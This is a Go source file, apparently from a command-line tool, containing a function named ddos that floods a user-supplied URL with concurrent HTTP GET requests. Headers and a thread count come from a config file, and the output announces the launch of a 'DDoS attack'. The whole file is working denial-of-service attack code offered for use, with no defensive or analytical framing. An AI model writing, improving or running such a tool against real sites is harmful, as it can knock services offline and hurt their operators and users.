package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sync"

	"github.com/fatih/color"
)

func createRequest(url string) *http.Request {
	req, _ := http.NewRequest("GET", url, nil)
	return req
}

func ddos(urlStr string, configFile string) {
	greenPrn := color.New(color.FgGreen)
	redPrn := color.New(color.FgRed)

	greenPrn.Print("  ‣ ")
	fmt.Print("Initiating ")
	greenPrn.Print("DDoS")
	fmt.Println(" attack...")

	_, err := url.ParseRequestURI(urlStr)
	if err != nil {
		greenPrn.Print("  ‣ ")
		redPrn.Print("Invalid ")
		fmt.Printf("input URL: %s\n", urlStr)

		return
	}

	_, configExists := os.Stat(configFile)
	if os.IsNotExist((configExists)) {
		greenPrn.Print("  ‣ ")
		redPrn.Print("Error ")
		fmt.Printf("reading config file: %s.\n", configFile)

		return
	}

	properties := loadPropertiesFile(configFile)
	greenPrn.Print("  ‣ ")
	fmt.Print("Loaded configuration file ")
	greenPrn.Print("successfully")
	fmt.Println(".")

	client := &http.Client{}
	req := createRequest(urlStr)
	threadCount := 0

	keys := properties.Keys()
	for i := 0; i < len(keys); i++ {
		currentKey := keys[i]

		if currentKey != "Thread-Count" {
			value, found := properties.Get(currentKey)

			if found {
				req.Header.Add(currentKey, value)
			}
		} else {
			threadCount += properties.GetInt("Thread-Count", 0)
		}
	}

	greenPrn.Print("  ‣ ")
	fmt.Print("Launching DDoS ")
	greenPrn.Print("attack")
	fmt.Println(".")

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)

		go func(iterNum int) {
			response, err := client.Do(req)
			defer wg.Done()

			if err != nil {
				redPrn.Printf("    [%d] ", iterNum+1)
				fmt.Printf("Error: %s\n", err.Error())

				return
			}

			greenPrn.Printf("    [%d] ", iterNum+1)
			fmt.Printf("Request sent. (%d)\n", response.StatusCode)
		}(i)
	}
	wg.Wait()

	greenPrn.Print("  ‣ ")
	greenPrn.Print("Done ")
	fmt.Print("launching DDoS attack")
	fmt.Println(".")
}
